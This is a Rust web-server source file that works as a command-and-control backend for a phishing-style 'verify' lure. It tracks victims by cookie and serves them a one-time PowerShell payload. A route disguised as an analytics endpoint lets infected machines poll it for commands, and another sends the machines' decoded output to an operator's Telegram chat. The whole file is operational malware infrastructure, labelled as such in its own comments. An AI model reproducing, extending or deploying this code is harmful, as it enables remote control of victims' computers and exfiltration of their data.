use crate::{AppState, escape_html, index::INDEX_HTML, payload, get_now};
use axum::{Json, Router, extract::{Host, Path, Query, State}, http::{HeaderMap, StatusCode}, response::{Html, IntoResponse, Redirect}, routing::{get, post}};
use axum_extra::extract::cookie::{Cookie, CookieJar};
use std::{collections::HashMap, sync::Arc};
use teloxide::{prelude::*, types::{ChatId, ParseMode}};
use base64::{Engine as _, engine::general_purpose::STANDARD};
use sqlx::Row;
use uuid::Uuid;


pub async fn router(state:Arc<AppState>) -> Router {
    
    Router::new()

            /* landing page cookie based 
             * using uuid as dynamic endpoint 
             * having uuid as cookie for victim identifier logic 
             * redirect if victim is already on db*/
            .route("/", get(|jar: CookieJar, State(s): State<Arc<AppState>>| async move {
                let (uid, jar) = match jar.get("_uid") {
                    Some(uid) => (uid.value().to_string(), jar),
                    None => {
                                let uid = Uuid::new_v4().to_string(); 			    
                                let c = Cookie::build(("_uid", uid.clone())).path("/").max_age(time::Duration::days(30)).http_only(true).build();
                                (uid, jar.add(c))
                            }
                };

                let row = sqlx::query("SELECT 1 FROM victims WHERE uuid = ?").bind(&uid).fetch_optional(&s.db).await.unwrap();
                let verify = jar.get("_vc").map(|c| c.value() == "true").unwrap_or(false);
                if row.is_some() && verify { 
                    return (jar, Redirect::to(&s.redirect.lock().unwrap())).into_response(); 
                }

                (jar, Html(INDEX_HTML.replace("{{UUID}}", &uid))).into_response()
                
            }))        
             
            /* poll and query 
             * check if user downloaded the payload and clicked the verify button
             * save query on db to identify and redirect the victim*/ 
           .route("/:uuid", get(|Path(u): Path<String>, State(s): State<Arc<AppState>>, Query(q): Query<HashMap<String, String>>| async move {
               let redirect = s.redirect.lock().unwrap().clone();
               let row = sqlx::query("SELECT token FROM victims WHERE uuid = ?").bind(&u).fetch_optional(&s.db).await.unwrap();
               
               let download = row.map(|r| r.get::<Option<String>, _>("token").is_some()).unwrap_or(false);
               if download && q.get("verify") == Some(&"true".to_string()) {
                    let _ = sqlx::query("UPDATE victims SET verify = 1 WHERE uuid = ?").bind(&u).execute(&s.db).await; 
                    return redirect.into_response(); 
                }

                Json(serde_json::json!({ "v": download, "r": redirect})).into_response()
            }))     
                
            /* server the one time powershell payload */
             .route("/:uuid", post(|Path(u): Path<String>, State(s): State<Arc<AppState>>, Host(h): Host| async move {

                let token = Uuid::new_v4().to_string();

                let res = sqlx::query("INSERT OR IGNORE INTO victims (uuid, token, last_seen) VALUES (?, ?, ?)")
                                                .bind(&u)
                                                .bind(&token)
                                                .bind(get_now() as i64)
                                                .execute(&s.db)
                                                .await
                                                .unwrap();

                if res.rows_affected() > 0 {
                    return payload::payload(&h, &token).into_response();
                }

                StatusCode::NOT_FOUND.into_response()
             })) 


            /* check the header having token as header 
             * poll from victim machine to get commands */
            .route("/analytics/v2/:id", get(|headers: HeaderMap, Path(id): Path<String>, State(s): State<Arc<AppState>>| async move {
                let auth = headers.get("Authorization").and_then(|v| v.to_str().ok()).unwrap_or("");
                if auth != id { return StatusCode::NOT_FOUND.into_response(); }
                
                let row = sqlx::query("SELECT last_seen FROM victims WHERE token = ?").bind(&id).fetch_optional(&s.db).await.unwrap();
                
                if let Some(r) = row {
                    let last_seen: i64 = r.get("last_seen");
                    let now = get_now() as i64;
                    if now - last_seen > 60 {
                        let _ = sqlx::query("UPDATE victims SET last_seen = ? WHERE token = ?").bind(now).bind(&id).execute(&s.db).await;
                    }
                } else { return StatusCode::NOT_FOUND.into_response(); }

                if let Some((_, (cmd, expiry))) = s.command.remove(&id) {
                    if get_now() < expiry { return (StatusCode::OK, cmd).into_response(); }
                }

                StatusCode::NOT_FOUND.into_response() 
            }))

            // handle the victim POST data output and forwards to telegram
            .route("/analytics/v2/:id", post(|headers: HeaderMap, Path(id): Path<String>, State(s): State<Arc<AppState>>, body: String| async move {
                let auth = headers.get("Authorization").and_then(|v| v.to_str().ok()).unwrap_or("");
                let exists = sqlx::query("SELECT 1 FROM victims WHERE token = ?").bind(&id).fetch_optional(&s.db).await.unwrap().is_some();
                if auth != id || !exists { return StatusCode::NOT_FOUND.into_response(); }
               
                let data = STANDARD.decode(body.trim().replace("\r", "").replace("\n", "")).map(|b| String::from_utf8_lossy(&b).to_string()).unwrap_or(body);
                let bot = s.bot.clone(); 
                let aid = s.admin_id;
                
                // output into chunks of bytes for the telegram
                for chunk in data.as_bytes().chunks(3500) {
                    let chunk = String::from_utf8_lossy(chunk);
                    let msg = format!("<code>{}</code>", escape_html(&chunk));
                    if let Ok(m) = bot.send_message(ChatId(aid), msg).parse_mode(ParseMode::Html).await {
                        s.msg.insert(m.id.0, get_now() + 600); 
                    }
                }

                StatusCode::OK.into_response()
            }))
            
            .fallback(|| async { 
                StatusCode::NOT_FOUND.into_response()
            })

            .with_state(state)

}

